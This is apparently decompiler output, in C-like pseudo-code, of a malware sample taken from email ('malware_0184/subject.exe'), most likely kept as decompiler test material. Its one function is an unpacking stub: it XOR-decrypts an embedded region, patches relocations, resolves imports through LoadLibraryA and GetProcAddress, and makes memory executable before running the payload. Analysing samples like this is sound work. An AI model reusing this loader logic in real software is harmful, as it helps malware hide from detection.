// subject.c
// Generated on 5/4/2015 12:46:21 AM by decompiling malware_via_email/malware_0184/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ecx, word32 edx, word32 esi, word32 dwArg00, word32 dwArg04)
{
fn00401000_entry:
l00401000:
	word32 eax_26 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebx_15 = 0x00000000
	word32 edi_285 = eax_26 + 0x0000001E
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l00401030
l0040102D:
	edi_285 = eax_26 + 0x0000001E ^ 0x0000000E
l00401030:
	Mem43[fp - 0x0000001C:word32] = 0x00000059
	CloseHandle(0xFFFFFFFF)
	Mem48[fp - 0x0000001C:word32] = fp - 0x00000008
	Mem50[fp - 0x00000020:word32] = 0x00000040
	Mem52[fp - 0x00000024:word32] = 0x00003000
	Mem54[fp - 0x00000028:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 eax_57 = 0x00000000
l00401051:
	branch ebx_15 != edi_285 l0040105A
l00401058:
	ebx_15 = 0x00000000
l0040105A:
	byte v15_79 = Mem54[eax_57 + 0x00401288:byte] ^ Mem54[ebx_15 + 0x00404000:byte]
	Mem80[eax_57 + 0x00401288:byte] = v15_79
	eax_57 = eax_57 + 0x00000001
	ebx_15 = ebx_15 + 0x00000001
	branch eax_57 <u 0x00001440 l00401051
l00401076:
	word32 ecx_120 = 0x00402588
	word32 esi_103 = 0x00000000
	word32 dwLoc04_118 = 0x00000000
l00401095:
	word32 eax_104 = Mem80[ecx_120 + 0x00000004:word32]
	word32 edx_110 = ecx_120 + 0x00000008
	branch eax_104 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004010D3
l004010A4:
	word32 edi_259 = eax_104 - 0x00000008 >>u 0x00000001
l004010A6:
	word32 eax_262 = (word32) Mem80[edx_110 + 0x00000000:word16]
	branch (eax_262 & 0x0000F000) != 0x00003000 l004010C7
l004010BC:
	word32 eax_276 = (eax_262 & 0x00000FFF) + Mem80[ecx_120 + 0x00000000:word32]
	Mem280[eax_276 + 0x00401008:word32] = Mem80[eax_276 + 0x00401008:word32] + 0xF0401008
l004010C7:
	edx_110 = edx_110 + 0x00000002
	edi_259 = edi_259 - 0x00000001
	branch edi_259 != 0x00000000 l004010A6
l004010CF:
	esi_103 = dwLoc04_118
l004010D3:
	esi_103 = esi_103 + Mem80[ecx_120 + 0x00000004:word32]
	dwLoc04_118 = esi_103
	ecx_120 = ecx_120 + Mem80[ecx_120 + 0x00000004:word32]
	branch esi_103 <u 0x000000E8 l00401095
l004010E8:
	word32 esi_124 = 0x00401D6C
	word32 dwLoc04_125 = 0x00401D6C
	branch Mem80[0x00401D7C:word32] == 0x00000000 l00401169
l004010FB:
	esi_168 = esi_124
l00401100:
	word32 esi_168
	word32 eax_173 = LoadLibraryA(Mem80[esi_168 + 0x0000000C:word32] + 0x00401008)
	branch eax_173 == 0x00000000 l0040115C
l00401115:
	word32 edi_197 = Mem80[esi_168 + 0x00000000:word32]
	branch edi_197 != 0x00000000 l0040111E
l0040111B:
	edi_197 = Mem80[esi_168 + 0x00000010:word32]
l0040111E:
	word32 edi_202 = edi_197 + 0x00401008
	word32 esi_205 = Mem80[esi_168 + 0x00000010:word32] + 0x00401008
	branch Mem80[edi_202 + 0x00000000:word32] == 0x00000000 l00401158
l0040112D:
l00401130:
	word32 dwLoc1C_239
	word32 eax_234 = Mem80[edi_202 + 0x00000000:word32]
	word16 ax_235 = (word16) eax_234
	branch eax_234 >= 0x00000000 l0040113F
l00401139:
	dwLoc1C_239 = (word32) ax_235
	goto l00401144
l0040113F:
	dwLoc1C_239 = eax_234 + 0x0040100A
l00401144:
	Mem246[esi_205 + 0x00000000:word32] = GetProcAddress(eax_173, dwLoc1C_239)
	edi_202 = edi_202 + 0x00000004
	esi_205 = esi_205 + 0x00000004
	branch Mem246[edi_202 + 0x00000000:word32] != 0x00000000 l00401130
l00401158:
	esi_168 = dwLoc04_125
l0040115C:
	esi_168 = esi_168 + 0x00000014
	dwLoc04_125 = esi_168
	branch Mem80[esi_168 + 0x00000010:word32] != 0x00000000 l00401100
l00401169:
	call 0x00401A68 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
	call 0x00401A68 (retsize: 4; depth: 12)
	ExitProcess(0x00000000)
fn00401000_exit:
}

